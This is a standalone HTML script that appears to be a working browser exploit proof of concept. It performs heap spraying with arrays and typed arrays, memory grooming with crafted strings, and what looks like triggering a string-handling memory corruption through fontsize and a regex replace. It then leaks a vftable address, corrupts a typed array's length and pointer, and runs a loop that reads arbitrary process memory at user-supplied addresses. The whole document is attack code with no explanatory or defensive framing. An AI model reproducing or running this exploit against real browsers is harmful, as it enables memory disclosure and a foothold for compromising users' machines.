<script>	
alert("start19");
var spray=new Array(0x800);
var tmp;
 for(var i=0;i<spray.length;i+=2){
 spray[i]=new Array(0x1e00);
 spray[i+1]=new Uint32Array(0x10000/4);
  tmp=spray[i+1];
  for(var j=0;j<0x10000/4;j+=2){
   tmp[j]=i+1+0xAA000000;//(j<<12)+i;
   tmp[j+1]=j+0xBB000000;
  }
  tmp[0]=i+1;
  tmp=spray[i];
 for(var j=0;j<0x1e00;j+=2){
  tmp[j]=spray;
  tmp[j+1]=i;
 }
}
alert("spray done");
function gc() {
    try {
        var c = document.createElement("canvas");
        var gl = c.getContext("2d");

        for (var i = 0; i < 100; i++) {
            var gggg = gl.createImageData(1, 0x2000)
        }
    } catch (e) {

    }
}
function createStringWithRepeatedChar(c, multiplicity) {
    while (c.length < multiplicity)

        c += c;

    return c;

}
gc();

var size = 0x220; //fengshui size
var multiplicity = size/2
multiplicity -= 22
multiplicity -= 0x10
var c ="\u0000"
while (c.length < multiplicity){
c += c;
}
var d="\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000"+
      "\u7000\u0000\u7000\u0000\u0000\u0000\u0000\u0000"+
      "\u0000\u0000\u0000\u0000\u5000\uFFFB\uFFFF\u0000"+
      "\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000"+
      "\u0000\u0000\u0000\u0000\u0000\u0000\u0000\u0000"+
      "\u0000\u0000\u8000\u0000\u0000\u0000\u0000\u0000";
c=d+c;
c = c.substring(0, multiplicity);
var x = "1";
var getSize = function(size) {return (size-0x14)/2} //string header size = 0x20
x = createStringWithRepeatedChar(x, 0x1000000);
x += '2'
var y = null
var arr = new Array(0x1000)
var cvs = document.createElement('canvas')
//fill some hole

var s1,s2; 
for (var i = 0; i <0x800; i++) {
arr[i] = c.fontsize(1)
}
var cvs1 = document.createElement('canvas')
s2 = c.fontsize(2)
s1 =c.fontsize(1)
var arrcvs=new Array(0x41);
for(var j=0;j<arrcvs.length;j++){
arrcvs[j]=0xAAAA;
}

//arrcvs.sort();
x.replace(/\d/g, s1);
alert("ok");
//alert(arrcvs[0].toString(16));

var a=0;
var b="";
a=0x50000000/2;
while(s1.charCodeAt(a)!=0xAA00){
 a+=1;
}
var spray_index=s1.charCodeAt(a-1);
var typedarray_index=s1.charCodeAt(a+1);
a=0x50010000/2;
while(s1.charCodeAt(a)!=0xFFFB){
 a+=1;
}
var arr_addr=(s1.charCodeAt(a-1)<<16)+s1.charCodeAt(a-2)
//alert(arr_addr.toString(16));
a=arr_addr/2;
var vftable=s1.charCodeAt(a)+(s1.charCodeAt(a+1)<<16);
//alert(vftable.toString(16));
for(var i=typedarray_index;i<typedarray_index+0x40/4;i++){
 spray[spray_index][typedarray_index]=0;
}
spray[spray_index][typedarray_index]=vftable;
spray[spray_index][typedarray_index+0x30/4]=0x10000;//length
spray[spray_index][typedarray_index+0x38/4]=0xffffffff;//addr;
while(1){
a=prompt("addr");
b="";
if(a==0){
 break;   
}
a=a/2;
b+=s1.charCodeAt(a).toString(16);
b+=" ";
b+=s1.charCodeAt(a+1).toString(16);
b+=" ";
b+=s1.charCodeAt(a+2).toString(16);
b+=" ";
b+=s1.charCodeAt(a+3).toString(16);
b+=" ";
b+=s1.charCodeAt(a+4).toString(16);
b+=" ";
b+=s1.charCodeAt(a+5).toString(16);
b+=" ";
b+=s1.charCodeAt(a+6).toString(16);
b+=" ";
b+=s1.charCodeAt(a+7).toString(16);      
alert(b);
}
alert("end");
</script>
